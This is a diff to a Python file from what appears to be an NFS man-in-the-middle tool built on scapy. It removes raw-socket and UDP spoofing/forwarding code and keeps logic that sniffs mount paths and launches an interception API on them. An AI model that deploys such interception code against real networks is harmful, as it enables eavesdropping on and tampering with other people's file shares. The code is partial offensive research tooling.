@@ -10,7 +10,6 @@ from scapy.contrib.oncrpc import RPC
 from scapy.layers.inet import IP, TCP
 from scapy.layers.l2 import Ether
 from scapy.sendrecv import sniff, sr1
-from scapy.supersocket import StreamSocket
 
 
 # @PARAM
@@ -80,8 +79,7 @@ class MitmForwarder:
 	# create tcp servers to listen for and forward connections to target
 	def tcp_proxy(self):
 		# create thread for python socket to "accept" messages
-		threading.Thread(target=self.raw_tcp_listen,).start()
-		# threading.Thread(target=self.tcp_listen, args=('', self.target_port)).start()
+		threading.Thread(target=self.tcp_listen, args=('', self.target_port)).start()
 
 		# listen with scapy to actually forward and process
 		str_filter = "tcp and port " + str(self.target_port)
@@ -99,17 +97,6 @@ class MitmForwarder:
 			try:
 				sock.connect((host, port))
 				sock.recv(64512)
-			except:
-				pass
-
-	@staticmethod
-	def raw_tcp_listen():
-		sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-		sock.bind(('ens33', 0))
-		while True:
-			try:  # accept packets
-				raw_buffer = sock.recvfrom(65565)[0]
-				ip_header = IP(raw_buffer[0:20])  # create ip header
 			except:
 				pass
 
@@ -134,91 +121,15 @@ class MitmForwarder:
 				print("\t - forwarding to " + str(self.client_address))
 			sr1(pkt)
 
-	# ==================== UDP FORWARDING ==================== #
-
-	# create udp servers to listen for and forward connections to target
-	def udp_proxy(self):
-		# create socket to listen for connection from client
-		proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		proxy_socket.bind(('', self.target_port))
-		proxy_socket = StreamSocket(proxy_socket)
-
-		# create address variables
-		server_address = (self.server_address, int(self.target_port))
-		client_address = None
-
-		while True:
-			data, address = proxy_socket.recvfrom(65412)
-			self.filter_packets(data, self.server_address)
-
-			#  create spoof socket to send packets from
-			spoof_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			spoof_socket.bind(('', address[1]))
-			spoof_socket = StreamSocket(spoof_socket)
-
-			if client_address is None:
-				client_address = address
-			# client addr, send to server (listen on spoof socket for resp)
-			if address == client_address:
-				print(
-					"[+ UDP ] " + tuple_to_addr(client_address) + " >>> " + tuple_to_addr(server_address) + " [" + str(
-						len(data)) + "]")
-				spoof_socket.sendto(data, server_address)
-				self.udp_listen(spoof_socket, proxy_socket)
-			# server addr, send to client
-			elif address == server_address:
-
-				print(
-					"[+ UDP ] " + tuple_to_addr(server_address) + " >>> " + tuple_to_addr(client_address) + " [" + str(
-						len(data)) + "]")
-				proxy_socket.sendto(data, client_address)
-				client_address = None
-			# unknown addr, send to server
-			else:
-				print(
-					"[+ UDP ] " + tuple_to_addr(server_address) + " >>> " + tuple_to_addr(client_address) + " [" + str(
-						len(data)) + "]")
-				proxy_socket.sendto(data, client_address)
-				client_address = None
-
-	@staticmethod
-	def udp_listen(src, dst):
-		data, address = src.recv(65412)
-		dst.send(data)
-
 	# ==================== PACKET FILTERING ==================== #
 
 	# filter packets for data of interest - i.e., mount port and mount path
 	def filter_packets(self, pkt):
-		# port = self.filter_mount_port(pkt)
-		# if port != -1 and port not in self.mount_ports:
-		# 	print("[* INF ] starting forwarders on port " + str(port))
-		# 	_thread.start_new_thread(MitmForwarder, (remote_ip, port))
-		# 	_thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
-		# 	self.mount_ports.append(port)
-
 		# filter path, start mitm API
 		path = self.filter_mount_path(pkt)
 		if path != -1:  # if proper mount path, start API on path for clients
 			print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
 			_thread.start_new_thread(NfspionageApi, (self.server_address, path))
-
-	# @staticmethod
-	# def filter_mount_port(pkt):
-	# 	try:  # get port number from last few bytes
-	# 		sz = len(data)
-	# 		x = data[sz - 2:sz]
-	# 		tmp = x.hex()
-	# 		port = int(tmp, 16)
-	#
-	# 		if port != 0 and port > 100:
-	# 			print("[* INF ] MOUNT on port " + str(port))
-	# 			return port
-	# 		else:
-	# 			return -1
-	# 	except Exception as e:  # error getting mount port
-	# 		str("[- EXP ] " + str(e))
-	# 		return -1
 
 	@staticmethod
 	def filter_mount_path(pkt):
@@ -228,5 +139,5 @@ class MitmForwarder:
 			print("[* INF ] MOUNT on path " + path)
 			return path
 		except Exception as e:  # error getting mount path
-			print("[- EXP ] " + str(e))
+			# print("[- EXP ] " + str(e))
 			return -1
